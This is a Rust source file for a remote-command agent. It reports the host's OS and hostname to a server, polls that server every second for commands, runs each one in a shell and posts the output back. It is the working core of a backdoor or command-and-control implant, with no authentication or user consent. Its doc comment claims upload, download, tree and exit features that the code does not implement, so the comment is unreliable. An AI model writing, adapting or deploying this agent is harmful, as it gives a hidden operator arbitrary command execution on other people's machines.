use std::io::{self, Read};
use std::process::Command;
use std::env;
use std::fs;
use std::path::Path;
use serde_json::{json, Value};
use uuid::Uuid;
use hostname;
use os_info;

#[cfg(windows)]
fn create_command(command: &str, args: &[&str]) -> Command {
    let mut cmd = Command::new("cmd");
    cmd.arg("/C").arg(command);
    cmd.args(args);
    cmd
}

#[cfg(not(windows))]
fn create_command(command: &str, args: &[&str]) -> Command {
    let mut cmd = Command::new(command);
    cmd.args(args);
    cmd
}

async fn execute_and_capture(cmd: &str, args: &[&str]) -> io::Result<String> {
    let output = Command::new(cmd)
        .args(args)
        .output()?;

    Ok(format!("Exit Code: {}\nStdout:\n{}\nStderr:\n{}", 
        output.status,
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)))
}

// Add tree-related functions for fun
fn display_tree(path: &Path, prefix: &str, is_last: bool) -> io::Result<()> {
    let display = path.file_name()
        .unwrap_or_else(|| path.as_os_str())
        .to_string_lossy();
    
    println!("{}{}{}", prefix, 
        if is_last { "└── " } else { "├── " }, 
        display);

    if path.is_dir() {
        let entries = fs::read_dir(path)?
            .collect::<Result<Vec<_>, io::Error>>()?;
        
        for (i, entry) in entries.iter().enumerate() {
            let new_prefix = format!("{}{}", 
                prefix,
                if is_last { "    " } else { "│   " }
            );
            display_tree(&entry.path(), &new_prefix, i == entries.len() - 1)?;
        }
    }
    Ok(())
}

async fn execute_command(cmd_parts: &[&str]) -> io::Result<String> {
    if cmd_parts.is_empty() {
        return Ok(String::new());
    }

    let output = if cfg!(windows) {
        // Join all parts for Windows cmd.exe
        let full_command = cmd_parts.join(" ");
        create_command(&full_command, &[]).output()?
    } else {
        // Use first part as command and rest as args for Unix
        create_command(cmd_parts[0], &cmd_parts[1..]).output()?
    };

    Ok(format!("{}{}", 
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)))
}

fn stdin_ready() -> io::Result<bool> {
    let mut stdin = io::stdin();
    let mut buf = [0u8; 1];
    Ok(stdin.read(&mut buf)? > 0)
}

async fn send_heartbeat(server_addr: &str, agent_id: &str) -> io::Result<()> {
    let url = if !server_addr.starts_with("http://") {
        format!("http://{}/agent/heartbeat", server_addr)
    } else {
        format!("{}/agent/heartbeat", server_addr)
    };
    
    println!("[DEBUG] Sending heartbeat to {}", url);
    
    let os = os_info::get();
    let hostname = hostname::get()?
        .to_string_lossy()
        .to_string();

    let data = json!({
        "id": agent_id,
        "os": os.os_type().to_string(),
        "hostname": hostname,
        "commands": Vec::<String>::new()
    });

    match ureq::post(&url)
        .set("Content-Type", "application/json")
        .send_json(data)
    {
        Ok(response) => {
            println!("[DEBUG] Heartbeat response: {:?}", response.status());
            Ok(())
        },
        Err(e) => {
            println!("[ERROR] Failed to send heartbeat: {}", e);
            Err(io::Error::new(io::ErrorKind::Other, e.to_string()))
        }
    }
}

async fn get_command(server_addr: &str) -> io::Result<Option<String>> {
    match ureq::get(&format!("{}/get_command", server_addr)).call() {
        Ok(response) => {
            if response.status() == 200 {
                Ok(Some(response.into_string()?))
            } else {
                Ok(None)
            }
        },
        Err(e) => Err(io::Error::new(io::ErrorKind::Other, format!("Failed to get command: {}", e))),
    }
}

// This is a simple command shell that allows for basic file operations and command execution.
// It can change directories, upload and download files, and display a directory tree.
// PRECONDITION: The server must be running and accessible at the specified address.
// POSTCONDITION: The shell will exit when the user types 'exit'.
pub async fn run_shell(server_addr: &str) -> io::Result<()> {
    let agent_id = Uuid::new_v4().to_string();
    println!("[DEBUG] Starting shell with agent ID: {}", agent_id);

    let base_url = if !server_addr.starts_with("http://") {
        format!("http://{}", server_addr)
    } else {
        server_addr.to_string()
    };

    // Set working directory to user's home on Windows
    #[cfg(windows)]
    if let Ok(home) = env::var("USERPROFILE") {
        env::set_current_dir(home)?;
    }

    send_heartbeat(&base_url, &agent_id).await?;
    
    loop {
        // Poll for commands
        println!("[DEBUG] Polling for commands...");
        match ureq::get(&format!("{}/get_command", base_url)).call() {
            Ok(response) => {
                if response.status() == 200 {
                    let command = response.into_string()?;
                    println!("[DEBUG] Received command: {}", command);
                    
                    // Handle command differently based on platform
                    #[cfg(windows)]
                    let cmd_parts: Vec<&str> = vec![&command];
                    
                    #[cfg(not(windows))]
                    let cmd_parts: Vec<&str> = command.split_whitespace().collect();
                    
                    // Execute command and get output
                    match execute_command(&cmd_parts).await {
                        Ok(output) => {
                            println!("[DEBUG] Sending command result...");
                            match ureq::post(&format!("{}/submit_result", base_url))
                                .set("X-Command", &command)
                                .send_string(&output)
                            {
                                Ok(_) => println!("[DEBUG] Result sent successfully"),
                                Err(e) => println!("[ERROR] Failed to send result: {}", e)
                            }
                        },
                        Err(e) => println!("[ERROR] Command execution failed: {}", e)
                    }
                }
            }
            Err(e) => println!("[ERROR] Failed to poll commands: {}", e)
        }
        
        tokio::time::sleep(tokio::time::Duration::from_secs(1)).await;
    }
}
